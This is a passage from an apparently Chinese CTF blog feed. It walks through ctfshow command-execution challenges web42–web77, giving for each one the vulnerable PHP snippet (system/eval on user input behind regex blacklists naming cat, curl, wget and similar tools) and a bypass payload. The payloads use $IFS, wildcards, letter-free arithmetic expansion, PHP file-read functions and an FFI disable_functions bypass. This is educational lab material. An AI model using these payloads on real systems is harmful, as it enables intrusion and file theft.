class="line">具体函数功能看最前部分</span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到linux命令中的分隔符，前面总结中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls;</span><br><span class="line">c=cat flag.php;||c=cat f*;</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了分隔符引号和文本读取cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多过滤了flag，通配符即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多了个空格被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at%<span class="number">09</span>f*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加数字过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br><span class="line">c=nl&lt;fl<span class="string">''</span>ag.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上题的payload能打通</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同上题payload，增加的过滤无影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多过滤了百分号，同上题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>增加十六进制对制表符等的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>过滤了尖括号，空格换种方式绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$IFS/fl%<span class="number">27</span>%<span class="number">27</span>ag||</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>改变了形式，不再需要命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$&#123;IFS&#125;fl%<span class="number">27</span>%<span class="number">27</span>ag.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里过滤很严格，但是依旧可以绕过，用通配符和bash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@-[]是linux下的匹配符，是进行匹配的大写字母</span><br></pre></td></tr></table></figure><p>起一个文件上传的网页，上传文件抓个包，具体知识点看截图</p><img src="/2020/09/22/ctfshowcommand/1.png" class=""><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>解法跟55同</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">"cat "</span>.$c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据提示flag在36.php文件中，无字母数字构造出36</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#$((~$(()))) -1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(()))))))) 1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，发现命令执行函数基本上都被ban了，这里要寻找其他方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line">其他师傅的姿势</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);          </span><br><span class="line">readfile(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure><h3 id="web59-web65"><a href="#web59-web65" class="headerlink" title="web59-web65"></a>web59-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">下面的payload来自_yu_师傅（感谢）</span><br><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetss($a);<span class="keyword">echo</span> $line;&#125;       <span class="comment">//php7.3版本后 该函数已不再被使用</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fpassthru($a);                                      <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fread($a,<span class="string">"1000"</span>);                                   <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过60</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;  <span class="comment">//过60</span></span><br><span class="line">单一函数读文件内容：</span><br><span class="line">函数：</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">用法：</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);           <span class="comment">//过58</span></span><br><span class="line">readfile(<span class="string">"flag.php"</span>);                         <span class="comment">//过58</span></span><br><span class="line">print_r(file(<span class="string">"flag.php"</span>));                    <span class="comment">//过59</span></span><br><span class="line">通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span><br><span class="line">函数：</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">用法：</span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);             <span class="comment">//过60</span></span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);           <span class="comment">//过60</span></span><br></pre></td></tr></table></figure><h3 id="web66-web70"><a href="#web66-web70" class="headerlink" title="web66-web70"></a>web66-web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码部分没有改变，变得是文件位置，需要对目录结构进行扫描</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);</span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);</span><br><span class="line"><span class="comment">#由于后面的文件都是txt文件，所以可以直接用include进行包含</span></span><br><span class="line"></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);          <span class="comment">//过66-67                              </span></span><br><span class="line">c=$a=opendir(<span class="string">"/"</span>); <span class="keyword">while</span> (($file = readdir($a)) !== <span class="keyword">false</span>)&#123;<span class="keyword">echo</span> $file . <span class="string">"&lt;br&gt;"</span>; &#125;;highlight_file(<span class="string">"/flag.txt"</span>);                       <span class="comment">//过66-67</span></span><br></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的代码做出了小变化</p><p>可以看到这里会把读到的内容放到内存当中，并且会输出进行了正则替换后的内容，还是有方法进行绕过，让程序提前结束退出即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">exit</span>();||c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="web72-看-yu-师傅的blog"><a href="#web72-看-yu-师傅的blog" class="headerlink" title="web72(看_yu_师傅的blog)"></a>web72(看_yu_师傅的blog)</h3><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><h3 id="web75-web76"><a href="#web75-web76" class="headerlink" title="web75-web76"></a>web75-web76</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用mysql load_file读文件   <span class="comment">//过75,76</span></span><br><span class="line">读取目录</span><br><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">  <span class="keyword">foreach</span>($dbh-&gt;query(<span class="string">'select load_file("/var/www/html/index.php")'</span>) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">      <span class="keyword">echo</span>($row[<span class="number">0</span>]).<span class="string">"|"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $dbh = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">  <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">$FFI读取</span><br><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(char *command);"</span>, <span class="string">"libc.so.6"</span>);$a=<span class="string">'/readflag &gt; xxx.txt'</span>;$ffi-&gt;system($a);<span class="keyword">exit</span>();   <span class="comment">//访问xxx.txt</span></span><br><span class="line">放一篇文章：https:<span class="comment">//www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;command绕过&quot;&gt;&lt;a href=&quot;#command绕过&quot; class=&quot;headerlink&quot; title=&quot;command绕过&quot;&gt;&lt;/a&gt;command绕过
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
</feed>
